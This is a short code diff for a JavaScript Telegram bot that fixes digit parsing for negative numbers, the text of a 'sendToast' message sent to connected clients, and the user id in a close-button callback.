@@ -20,7 +20,7 @@ const makeFont = (string) => {
 }
 
 function isDigit(str) {
-    return /^\d+$/.test(str);
+    return /^-?\d+$/.test(str);
 }
 
 function chunkArray(array, chunkSize) {
@@ -218,7 +218,7 @@ bot.on("message", async (msg) => {
                                 cli.client.write(JSON.stringify({
                                     method: 'sendToast',
                                     length: 1,
-                                    message: msg.text.slice(_spl[0].length, msg.text.length).trim()
+                                    message: msg.text.trim()
                                 }));
                                 await bot.sendMessage(
                                     msg.chat.id,
@@ -359,7 +359,7 @@ bot.on('callback_query', async (call) => {
                         layers.push([]);
                         layers[layers.length - 1].push({
                             text: makeFont("close"),
-                            callback_data: `close_${msg.from.id}`
+                            callback_data: `close_${call.from.id}`
                         });
         
                         await bot.editMessageText(_str, {
